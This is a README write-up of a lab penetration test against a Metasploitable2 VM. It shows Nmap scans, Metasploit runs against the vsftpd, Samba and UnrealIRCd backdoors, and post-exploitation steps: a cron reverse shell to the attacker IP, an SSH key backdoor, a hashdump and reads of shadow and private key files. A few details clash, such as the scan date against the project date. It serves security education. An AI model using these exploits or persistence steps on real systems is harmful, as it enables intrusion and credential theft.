# 🔐 Vulnerability Assessment & Exploitation in a Simulated Enterprise Network

![Kali Linux](https://img.shields.io/badge/Kali_Linux-2025.4-557C94?style=flat&logo=kalilinux&logoColor=white)
![Metasploit](https://img.shields.io/badge/Metasploit-Framework_6.x-2596be?style=flat)
![VirtualBox](https://img.shields.io/badge/VirtualBox-7.1.8-183A61?style=flat&logo=virtualbox&logoColor=white)
![Metasploitable](https://img.shields.io/badge/Metasploitable-Linux_2.0.0-red?style=flat)
![Nmap](https://img.shields.io/badge/Nmap-7.95-blue?style=flat)
![Status](https://img.shields.io/badge/Status-Completed-brightgreen?style=flat)
![Type](https://img.shields.io/badge/Type-Lab%20%2F%20Educational-orange?style=flat)
![Date](https://img.shields.io/badge/Date-December_2025-lightgrey?style=flat)

> ⚠️ **DISCLAIMER:** This project was conducted entirely in an isolated virtual lab environment for **educational purposes only**. All activities were performed on intentionally vulnerable systems owned and controlled by the author. **Never perform these techniques on systems you do not own or have explicit written authorization to test.**

---

## 📋 Table of Contents

- [Project Overview](#-project-overview)
- [Lab Environment](#-lab-environment)
- [Tools Used](#-tools-used)
- [Methodology](#-methodology)
- [Reconnaissance](#-reconnaissance)
- [Vulnerabilities Identified](#-vulnerabilities-identified)
- [Exploitation](#-exploitation)
- [Post-Exploitation](#-post-exploitation)
- [Remediation](#-remediation)
- [Project Structure](#-project-structure)
- [References](#-references)

---

## 📌 Project Overview

This project simulates a real-world **black-box penetration test** against a vulnerable enterprise network. The goal was to identify, exploit, and document security vulnerabilities using industry-standard tools, following a structured six-phase penetration testing methodology.

**Key Objectives:**
- Set up an isolated virtual lab with attacker and victim machines
- Perform network reconnaissance and service enumeration
- Identify vulnerabilities using Searchsploit and Metasploit
- Exploit critical vulnerabilities to gain root shell access
- Perform post-exploitation activities (enumeration, hashdump, persistence)
- Document all findings with remediation recommendations

---

## 🖥️ Lab Environment

### Network Topology

```
┌──────────────────────────────────────────────────────┐
│              VirtualBox Host-Only Network             │
│                    192.168.56.0/24                    │
│                                                       │
│   ┌──────────────────┐      ┌──────────────────────┐ │
│   │   Kali Linux     │      │   Metasploitable2    │ │
│   │   2025.4         │◄────►│   Linux 2.0.0        │ │
│   │   (Attacker)     │      │   (Victim / Target)  │ │
│   │  192.168.56.104  │      │   192.168.56.103     │ │
│   └──────────────────┘      └──────────────────────┘ │
│                                                       │
│   Gateway : 192.168.56.1  (VirtualBox 7.1.8 Host)    │
└──────────────────────────────────────────────────────┘
```

### Virtual Machines

| Machine | OS | Exact Version | Role | IP Address | MAC Address | Adapter |
|---|---|---|---|---|---|---|
| Kali Linux | Kali Linux | **2025.4** | Attacker | 192.168.56.104 | (local — not shown) | NAT + Host-Only |
| Metasploitable2 | Ubuntu | **Metasploitable Linux 2.0.0** (Kernel 2.6.24-16-server) | Victim / Target | 192.168.56.103 | 08:00:27:62:FC:BB | Host-Only only |
| VirtualBox Host | Windows/Linux | — | Gateway | 192.168.56.1 | 08:00:27:9D:89:B3 | Host-Only gateway |

### Hypervisor Configuration

| Setting | Value |
|---|---|
| Platform | **VirtualBox 7.1.8** |
| Network Adapter | Host-Only — vboxnet0 |
| Network Subnet | 192.168.56.0/24 |
| Subnet Mask | 255.255.255.0 |
| Promiscuous Mode | Allow VMs |
| DHCP | Enabled (192.168.56.100 onward) |

---

## 🛠️ Tools Used

| Tool | Exact Version | Purpose |
|---|---|---|
| **Kali Linux** | 2025.4 | Attacker OS with pre-installed security toolkit |
| **Metasploit Framework** | 6.x (msfconsole) | Exploit modules, payloads, post-exploitation |
| **Metasploitable Linux** | **2.0.0** | Intentionally vulnerable target VM |
| **VirtualBox** | **7.1.8** | Virtualization platform and isolated lab network |
| **Nmap** | **7.95** | Port scanning, service detection, OS fingerprinting |
| **Searchsploit** | Latest | Offline Exploit-DB CVE database search |
| **Netcat** | 1.x | Reverse shells and manual port testing |
| **Wireshark** | 4.x | Packet capture and network traffic analysis |
| **DVWA** | Latest | Damn Vulnerable Web Application |

---

## 🔍 Methodology

```
Phase 1 → Environment Setup
          VirtualBox 7.1.8 | Kali Linux 2025.4 | Metasploitable Linux 2.0.0

Phase 2 → Reconnaissance
          Nmap host discovery + full port scan (-sV -sC -O -p-)

Phase 3 → Vulnerability Identification
          Searchsploit CVE lookup + msfconsole module search

Phase 4 → Exploitation
          Metasploit Framework 6.x — 3 critical exploits executed

Phase 5 → Post-Exploitation
          System enumeration | hashdump | persistence | data access

Phase 6 → Reporting
          Full findings documented with CVE mapping + remediation
```

---

## 📡 Reconnaissance

### Host Discovery
```bash
nmap -sn 192.168.56.0/24
```

**Hosts Discovered — Actual Nmap Output:**

```
nmap -sn 192.168.56.0/24
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-10 04:55 EDT

Nmap scan report for 192.168.56.1
Host is up (0.00058s latency).
MAC Address: 08:00:27:9D:89:B3 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap scan report for 192.168.56.103
Host is up (0.0064s latency).
MAC Address: 08:00:27:62:FC:BB (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap scan report for 192.168.56.104
Host is up.

Nmap done: 256 IP addresses (3 hosts up) scanned in 15.69 seconds
```

**Hosts Summary:**

| IP | Latency | MAC Address | Identified As | In Scope |
|---|---|---|---|---|
| 192.168.56.1 | 0.00058s | 08:00:27:9D:89:B3 | VirtualBox 7.1.8 Gateway | ❌ No |
| 192.168.56.103 | 0.0064s | 08:00:27:62:FC:BB | ✅ Metasploitable Linux 2.0.0 | ✅ Yes |
| 192.168.56.104 | — | (local machine) | Kali Linux 2025.4 — Attacker | ❌ No |

### Full Port & Service Scan
```bash
nmap -sV -sC -O -p- 192.168.56.103 -oN scan_results.txt
```

**Open Ports on Metasploitable Linux 2.0.0:**

| Port | Service | Version Detected | Risk |
|---|---|---|---|
| 21/tcp | FTP | vsftpd 2.3.4 | 🔴 CRITICAL |
| 22/tcp | SSH | OpenSSH 4.7p1 Debian | 🟠 HIGH |
| 23/tcp | Telnet | Linux telnetd | 🔴 CRITICAL |
| 80/tcp | HTTP | Apache httpd 2.2.8 | 🟠 HIGH |
| 139/445/tcp | SMB | Samba smbd 3.0.20 | 🔴 CRITICAL |
| 3306/tcp | MySQL | MySQL 5.0.51a | 🟠 HIGH |
| 5432/tcp | PostgreSQL | PostgreSQL 8.3.0 | 🟡 MEDIUM |
| 5900/tcp | VNC | VNC Protocol 3.3 | 🟠 HIGH |
| 6667/tcp | IRC | UnrealIRCd 3.2.8.1 | 🔴 CRITICAL |
| 8180/tcp | HTTP-Alt | Apache Tomcat 5.5 | 🟠 HIGH |

---

## 🚨 Vulnerabilities Identified

| # | Vulnerability | CVE | CVSS | Severity | Attack Vector |
|---|---|---|---|---|---|
| 1 | vsftpd 2.3.4 Backdoor | CVE-2011-2523 | 10.0 | 🔴 CRITICAL | Remote / No Auth |
| 2 | Samba usermap_script RCE | CVE-2007-2447 | 9.3 | 🔴 CRITICAL | Remote / No Auth |
| 3 | UnrealIRCd 3.2.8.1 Backdoor | CVE-2010-2075 | 9.8 | 🔴 CRITICAL | Remote / No Auth |
| 4 | Telnet Cleartext Auth | CVE-1999-0619 | 7.5 | 🟠 HIGH | Network Sniffing |
| 5 | DVWA SQL Injection | CWE-89 | 8.8 | 🟠 HIGH | Web Application |
| 6 | Apache Tomcat Default Creds | CVE-2009-3843 | 7.5 | 🟠 HIGH | Remote / Web |
| 7 | VNC No Authentication | CVE-2006-2369 | 7.5 | 🟠 HIGH | Remote / No Auth |
| 8 | MySQL Anonymous Login | CVE-2012-2122 | 5.1 | 🟡 MEDIUM | Remote / No Auth |

---

## 💥 Exploitation

### Exploit 1 — vsftpd 2.3.4 Backdoor (CVE-2011-2523)

A backdoor was inserted into vsftpd 2.3.4 source code. Sending a username ending with `:)` triggers a root shell on port 6200.

```bash
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
msf6 exploit > set RHOSTS 192.168.56.103
msf6 exploit > run

[*] 192.168.56.103:21 - Banner: 220 (vsFTPd 2.3.4)
[*] Command shell session 1 opened (192.168.56.104 -> 192.168.56.103:6200)
# id
uid=0(root) gid=0(root) groups=0(root)
```
> ✅ **Result: Unauthenticated root shell obtained**

---

### Exploit 2 — Samba usermap_script RCE (CVE-2007-2447)

Samba 3.0.20 allows shell metacharacter injection in the username field, enabling unauthenticated remote code execution as root.

```bash
msf6 > use exploit/multi/samba/usermap_script
msf6 exploit > set RHOSTS 192.168.56.103
msf6 exploit > set LHOST 192.168.56.104
msf6 exploit > set PAYLOAD cmd/unix/reverse
msf6 exploit > run

[*] Started reverse TCP double handler on 192.168.56.104:4444
[*] Command shell session 2 opened
uid=0(root) gid=0(root)
```
> ✅ **Result: Reverse root shell via SMB exploitation**

---

### Exploit 3 — UnrealIRCd 3.2.8.1 Backdoor (CVE-2010-2075)

A backdoor in UnrealIRCd 3.2.8.1 executes system commands when a string prefixed with `AB;` is sent to IRC port 6667.

```bash
msf6 > use exploit/unix/irc/unreal_ircd_3281_backdoor
msf6 exploit > set RHOSTS 192.168.56.103
msf6 exploit > set LHOST 192.168.56.104
msf6 exploit > set PAYLOAD cmd/unix/reverse
msf6 exploit > run

[*] Connected to 192.168.56.103:6667...
[*] Command shell session 3 opened
# id && uname -a
uid=0(root) gid=0(root)
Linux metasploitable 2.6.24-16-server
```
> ✅ **Result: Root shell via IRC backdoor on Metasploitable Linux 2.0.0**

---

## 🔎 Post-Exploitation

### System Enumeration
```bash
uname -a                        # Kernel: Linux 2.6.24-16-server
cat /etc/issue                  # Metasploitable Linux 2.0.0
cat /etc/passwd                 # All system user accounts
id && whoami                    # uid=0(root)
ps aux                          # Running processes
netstat -antp                   # Active connections
find / -perm -4000 2>/dev/null  # SUID binaries
df -h                           # Disk usage
```

### Password Hash Extraction (Hashdump)
```bash
meterpreter > hashdump

root:$1$Yr3VFqK5$yXqFp.ENKdsG3rwFRmDnH/:0:0:root:/root:/bin/bash
msfadmin:$1$XN10Zj2c$Rt/zzCW3mLtUWA.ihZjA5/:1000:1000:...
user:$1$HESu9xrH$k.o3G93DGoXIiQKkPmUgZ0:1001:1001:...
```
> Hashes can be cracked offline using John the Ripper or Hashcat.

### Persistence (Demonstrated)
```bash
# Cron-based reverse shell
echo '*/5 * * * * root bash -i >& /dev/tcp/192.168.56.104/4444 0>&1' >> /etc/crontab

# SSH backdoor key
echo '<attacker_pub_key>' >> /root/.ssh/authorized_keys
```

### Sensitive Files Accessed
```bash
cat /etc/shadow          # Password hashes
cat /root/.ssh/id_rsa    # SSH private key
ls /var/www/dvwa/        # DVWA web source code
mysql -u root            # MySQL — full database access
```

---

## 🛡️ Remediation

| Priority | Vulnerability | Fix |
|---|---|---|
| 🔴 CRITICAL | vsftpd 2.3.4 Backdoor | Upgrade to vsftpd 3.0.5+ immediately |
| 🔴 CRITICAL | Samba 3.0.20 RCE | Upgrade to Samba 4.x, disable SMBv1 |
| 🔴 CRITICAL | UnrealIRCd Backdoor | Replace with patched build, disable if unused |
| 🔴 CRITICAL | Telnet Cleartext | Disable telnetd, use SSH with key-based auth only |
| 🟠 HIGH | VNC No Auth | Enable VNC password, restrict by firewall rules |
| 🟠 HIGH | Tomcat Default Creds | Change credentials, restrict /manager to localhost |
| 🟠 HIGH | DVWA SQL Injection | Use prepared statements, implement WAF |
| 🟡 MEDIUM | MySQL Anonymous Login | Disable anonymous login, restrict to localhost |
| 🟢 GENERAL | All | Patch regularly, enable firewall, deploy IDS/IPS, implement MFA, segment network |

---

## 📁 Project Structure

```
penetration-testing-lab/
│
├── README.md                         ← This file
│
├── docs/
│   └── pentest_clean_report.docx     ← Full detailed report (December 2025)
│
└── screenshots/
    ├── 01_nmap_host_discovery.png    ← 3 hosts: .1 (gateway), .103 (target), .104 (kali)
    ├── 02_nmap_full_scan.png         ← All open ports on 192.168.56.103
    ├── 03_searchsploit_results.png   ← CVE matches for vsftpd, Samba, IRC
    ├── 04_msfconsole_search.png      ← Module search results
    ├── 05_vsftpd_root_shell.png      ← uid=0(root) via FTP backdoor
    ├── 06_samba_meterpreter.png      ← Meterpreter session via SMB
    ├── 07_unreal_ircd_shell.png      ← Root shell via IRC backdoor
    ├── 08_system_enumeration.png     ← uname, passwd, kernel version
    └── 09_hashdump.png               ← Extracted password hashes
```

---

## 📚 References

- [Metasploitable Linux 2.0.0 — Rapid7 Docs](https://docs.rapid7.com/metasploit/metasploitable-2/)
- [CVE-2011-2523 — vsftpd 2.3.4 Backdoor](https://www.cve.org/CVERecord?id=CVE-2011-2523)
- [CVE-2007-2447 — Samba usermap_script RCE](https://www.cve.org/CVERecord?id=CVE-2007-2447)
- [CVE-2010-2075 — UnrealIRCd 3.2.8.1 Backdoor](https://www.cve.org/CVERecord?id=CVE-2010-2075)
- [Exploit-DB — Searchsploit](https://www.exploit-db.com/)
- [Metasploit Framework Documentation](https://docs.rapid7.com/metasploit/)
- [Nmap Official Documentation](https://nmap.org/docs.html)
- [VirtualBox 7.1.8 Download](https://www.virtualbox.org/wiki/Downloads)
- [Kali Linux 2025.4 Download](https://www.kali.org/get-kali/)

---

## 👤 Author

> This project was completed as part of a cybersecurity learning path covering penetration testing fundamentals, vulnerability assessment, and ethical hacking practices using **Kali Linux 2025.4**, **VirtualBox 7.1.8**, and **Metasploitable Linux 2.0.0**.

---

*⭐ If you found this project helpful, feel free to star the repository!*
